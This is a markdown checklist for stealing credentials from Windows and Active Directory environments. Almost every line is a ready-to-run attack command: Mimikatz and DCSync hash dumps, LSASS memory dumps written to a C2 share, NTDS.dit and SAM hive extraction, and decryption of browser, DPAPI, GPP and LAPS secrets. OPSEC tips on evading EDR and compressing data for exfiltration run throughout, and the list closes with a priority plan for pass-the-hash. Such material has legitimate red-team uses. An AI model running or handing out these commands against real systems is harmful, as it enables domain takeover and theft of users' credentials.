# Credential Access Checklist

## Mimikatz Overview

- [ ] Check if running as admin: `whoami /groups` — Need SeDebugPrivilege for most actions
- [ ] Bypass PPL (Protected Process Light) if needed: `mimikatz !+` / `!processprotect`
- [ ] Check Windows Defender / AV status: `Get-MpComputerStatus` — Defender may block mimikatz in-memory
- [ ] **OPSEC**: Mimikatz is heavily signatured; use obfuscated loader or reflective DLL
- [ ] **OPSEC**: Many EDRs hook LSASS; use `sekurlsa::evasive` or indirect dumping

## Mimikatz Credential Dumping

- [ ] Logon passwords (wdigest): `sekurlsa::logonpasswords` — Dump plaintext if wdigest enabled (Windows 8+ disabled)
- [ ] Logon passwords (tspkg / livessp): `sekurlsa::tspkg` / `sekurlsa::livessp` — Credential providers with plaintext
- [ ] Kerberos tickets (TGT/TGS): `sekurlsa::kerberos` — Extract existing Kerberos tickets
- [ ] DPAPI master keys: `sekurlsa::dpapi` — Master keys for DPAPI-protected data
- [ ] Get LSASS key list: `sekurlsa::keys` — Enumerate all keys (DPAPI, Kerberos, etc.)
- [ ] Credential Manager: `vault::list` / `vault::cred` — Stored web/Windows credentials
- [ ] SAM hive: `lsadump::sam` — Local account hashes (requires SYSTEM)
- [ ] LSA secrets: `lsadump::secrets` — Service account passwords, GMSA, machine account passwords
- [ ] **OPSEC**: `sekurlsa::logonpasswords` triggers most EDR; use indirect dumping first

## DCSync

- [ ] Check DCSync rights: `Get-ObjectAcl -ResolveGUIDs | ? { $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -and $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" }`
- [ ] DCSync all users: `mimikatz lsadump::dcsync /domain:<domain> /all /csv`
- [ ] DCSync krbtgt: `mimikatz lsadump::dcsync /user:<domain>\krbtgt` — Needed for golden ticket
- [ ] DCSync specific user: `mimikatz lsadump::dcsync /user:<domain>\<target-user>`
- [ ] DCSync via Impacket: `secretsdump.py <domain>/<user>:<pass>@<dc-ip> -just-dc`
- [ ] DCSync with NTLM hash: `secretsdump.py -hashes <lm:nt> <domain>/<user>@<dc-ip> -just-dc`
- [ ] DCSync with Kerberos: `secretsdump.py -k <domain>/<user>@<dc-name> -just-dc`
- [ ] Extract only NTLM hashes: `secretsdump.py <domain>/<user>:<pass>@<dc-ip> -just-dc-ntlm`
- [ ] **OPSEC**: DCSync triggers event ID 4662 (Directory Service Access) on DC — VERY high risk
- [ ] **OPSEC**: Only accounts with Replication-Get-Changes-All right can DCSync (Domain/Enterprise Admins by default)

## LSASS Dump (Volatile)

- [ ] Procdump LSASS: `procdump64.exe -accepteula -ma lsass.exe lsass.dmp` — Less signatured than mimikatz
- [ ] Dump via Task Manager (if GUI): Task Manager -> Details -> lsass.exe -> Create dump file
- [ ] Dump via comsvcs.dll: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> lsass.dmp full`
- [ ] Dump via sqldumper.exe (if SQL installed): `SqlDumper.exe <pid> 0x01100` — Legit SQL tool
- [ ] Dump to network share: `procdump64.exe -ma lsass.exe \\<c2-server>\share\lsass.dmp`
- [ ] Process offline extraction: On your C2, load lsass.dmp in mimikatz: `sekurlsa::minidump lsass.dmp` then `sekurlsa::logonpasswords`
- [ ] **OPSEC**: Procdump is less monitored than mimikatz but still has signature
- [ ] **OPSEC**: `comsvcs.dll` method is well-known; EDRs detect it via command-line args
- [ ] **OPSEC**: If PPL enabled, need `mimikatz !+` or driver to bypass

## NTDIS.DIT Dump (Offline)

- [ ] Dump via volume shadow copy: `vssadmin create shadow /for=C: && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit`
- [ ] Copy SYSTEM hive for decryption: `reg save hklm\system C:\system.hive`
- [ ] Dump via ntdsutil: `ntdsutil "ac i ntds" "ifm" "create full C:\dump" q q` — Creates full NTDS export
- [ ] Extract hashes offline: `secretsdump.py -ntds ntds.dit -system system.hive LOCAL`
- [ ] **OPSEC**: ntdsutil logs event ID 1644; VSS is also logged but common for backup tools
- [ ] **OPSEC**: NTDS.dit is huge; compress (e.g., `7z a ntds.7z ntds.dit`) before exfil

## SAM / LSA Secrets

- [ ] Dump SAM: `reg save hklm\sam sam.hive && reg save hklm\system system.hive`
- [ ] Dump LSA secrets: `reg save hklm\security security.hive`
- [ ] Extract locally: `secretsdump.py -sam sam.hive -system system.hive LOCAL`
- [ ] Extract LSA secrets: `secretsdump.py -security security.hive -system system.hive LOCAL`
- [ ] Dump with impacket (remote): `secretsdump.py <domain>/<user>:<pass>@<target-ip>`
- [ ] **OPSEC**: Registry hives export is logged; must be admin

## GPP Passwords

- [ ] Find GPP files: `Get-ChildItem \\<domain>\SYSVOL\<domain>\Policies\ -Recurse -Include *.xml | % { Select-String -Path $_ -Pattern "cpassword" }`
- [ ] Check all GPP types: Groups.xml, Services.xml, ScheduledTasks.xml, Printers.xml, Drives.xml, DataSources.xml
- [ ] Decrypt: `gpp-decrypt <cpassword>` — Key is public (AES-256-ECB) since 2014
- [ ] Automated via CrackMapExec: `crackmapexec smb <target> -u <user> -p <pass> -M gpp_password`
- [ ] **OPSEC**: Low risk but SYSVOL access is logged; Microsoft released patch (KB2962486) to prevent admin from seeing cpassword

## LAPS Passwords

- [ ] Check if LAPS is installed: `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime` (Error? LAPS not installed)
- [ ] Read LAPS passwords: `Get-ADComputer <computer> -Properties ms-Mcs-AdmPwd` — Need delegated permission
- [ ] Read via LAPS module: `Find-AdmPwdExtendedRightsCheck -OrgUnit <ou>` — Check who can read LAPS
- [ ] Read LAPS via CrackMapExec: `crackmapexec ldap <dc-ip> -u <user> -p <pass> -M laps`
- [ ] **OPSEC**: LAPS read operations log as normal LDAP queries; low detection risk
- [ ] **OPSEC**: Only delegated users/groups can read LAPS attributes; cannot if not explicitly delegated

## Browser Credentials

- [ ] Chrome passwords: Look for `\Chrome\User Data\Default\Login Data` — SQLite DB with encrypted passwords
- [ ] Chrome key decryption: Use `Get-ChromePasswords.ps1` or `SharpChrome` — Decrypts via DPAPI master key
- [ ] Firefox passwords: `\Firefox\Profiles\*.default\logins.json` with `key3.db` or `key4.db`
- [ ] Firefox decrypt: Use `FirefoxDecrypt.py` or `SharpChrome` — Firefox stores credentials in logins.json
- [ ] Internet Explorer / Edge: Windows Credential Manager (see below) — Integrated with Windows vault
- [ ] **OPSEC**: Browser dumping is noisy locally but doesn't touch network; good for lateral movement opportunistically

## Windows Credential Manager / Vault

- [ ] List vaults: `vaultcmd /list` or `mimikatz vault::list`
- [ ] Dump vault creds: `mimikatz vault::cred`
- [ ] PowerShell vault reader: `Get-StoredCredential -Type Generic` — May require admin context
- [ ] Run vault enumeration as user: `cmdkey /list` — List stored credentials (Windows creds)
- [ ] **OPSEC**: Vault access is per-user; run as user who stored the creds to read them

## DPAPI (Data Protection API)

- [ ] List master keys (current user): `Get-ChildItem $env:APPDATA\Microsoft\Protect\*`
- [ ] List DPAPI master keys for all users: `ls C:\Users\*\AppData\Roaming\Microsoft\Protect\*`
- [ ] Dump domain DPAPI backup keys (domain admin): `mimikatz lsadump::backupkeys /system:<dc-ip>`
- [ ] Decrypt master key: `mimikatz dpapi::masterkey /in:<masterkey-file> /sid:<user-sid> /rpc`
- [ ] Decrypt with domain backup key: `mimikatz dpapi::masterkey /in:<masterkey-file> /pvk:<backup-key.pvk>`
- [ ] Decrypt Chrome passwords (after obtaining master key): `dpapi::chrome /in:"<chrome-login-data>" /masterkey:<mk>`
- [ ] **OPSEC**: DPAPI access is local and low-noise; requires user context or SYSTEM

## Credential Manager / Web Creds

- [ ] Enumerate Windows credential store: `mimikatz dpapi::cred`
- [ ] Enumerate Remote Desktop credentials: `cmdkey /list:TERMSRV/*` — RDP stored creds
- [ ] List saved RDP connections: `Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers"`
- [ ] **OPSEC**: Low noise, but accessing someone else's vault requires their login context

## WDigest / Plaintext Extraction

- [ ] Check if WDigest is enabled (pre-Win8/2012R2): `reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential`
- [ ] Enable WDigest (requires admin + reboot — noisy): `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1`
- [ ] **OPSEC**: WDigest was enabled by default pre-Win8/2012R2; modern systems have it off
- [ ] **OPSEC**: Enabling WDigest requires reboot = instant detection

## Secretsdump (Impacket)

- [ ] Full remote dump (admin): `secretsdump.py <domain>/<user>:<pass>@<target-ip>`
- [ ] Just SAM: `secretsdump.py -sam <target-ip> -system <target-ip>`
- [ ] Just LSA: `secretsdump.py -lsa <target-ip>`
- [ ] Just NTDS: `secretsdump.py -just-dc <domain>/<user>:<pass>@<dc-ip>`
- [ ] Use Kerberos auth: `secretsdump.py -k <domain>/<user>@<dc-ip> -just-dc`
- [ ] Use hashes for auth: `secretsdump.py -hashes <lm:nt> <domain>/<user>@<dc-ip> -just-dc`
- [ ] History mode (include password history): `secretsdump.py -history <domain>/<user>:<pass>@<dc-ip>`
- [ ] **OPSEC**: Remote service interactions (SAMR/SRV) are logged on target

## Registry Secrets

- [ ] Check for auto-login creds: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`
- [ ] Check SNMP community strings: `reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities`
- [ ] Check wireless profile passwords: `netsh wlan show profile name=<profile> key=clear`
- [ ] Check for unattended install files: `ls C:\Windows\Panther\Unattend.xml`, `ls C:\Windows\Panther\Unattend\Unattend.xml`, `ls C:\Windows\System32\sysprep\sysprep.inf`
- [ ] **OPSEC**: Registry and file system reads are low noise but may be audited

## Remote Desktop / RDP Credential Access

- [ ] RDP stored credentials (user): `cmdkey /list:TERMSRV/*`
- [ ] RDP connection manager files: `.rdg` files stored in `%USERPROFILE%\Documents\Remote Desktops\`
- [ ] Server Manager cached creds: `%APPDATA%\Microsoft\ServerManager\`
- [ ] **OPSEC**: RDP credentials in vault are per-user; must be in that user's context

## OPSEC Summary

| Technique | Detection Risk | Required Priv | Notes |
|---|---|---|---|
| Mimikatz logonpasswords | Very High | Admin | Heavily signatured, use indirect |
| DCSync | Very High | DA/EA | Events on DC, extremely detectable |
| Procdump LSASS | Medium | Admin | Less signatured than mimikatz |
| comsvcs.dll dump | High | Admin | Command-line signature |
| VSS NTDS dump | Medium-High | Admin | Logs VSS events |
| SAM export | Medium | Admin | Registry export logging |
| GPP decryption | Low | Any domain user | Legacy, often patched |
| LAPS read | Low | Delegated users | Minimal logging |
| Browser credentials | Low | User/Admin | Local only |
| DPAPI | Low-Medium | User/Admin | RPC has some logging |
| Secretsdump remote | High | Admin | Service logging on target |

## Decision / Priority

1. If **Domain Admin** → go directly to **DCSync** (fastest, most complete)
2. If **Local Admin** → **Mimikatz sekurlsa::logonpasswords** (or procdump)
3. If **User level** → **Browser creds**, **Vault**, **GPP**, **DPAPI** (persistence hunting)
4. Create a `hashes.txt` file with all captured NTLM hash:user mappings for PtH attacks
5. Prioritize `krbtgt` hash, `Domain Admin` hashes, high-value service accounts
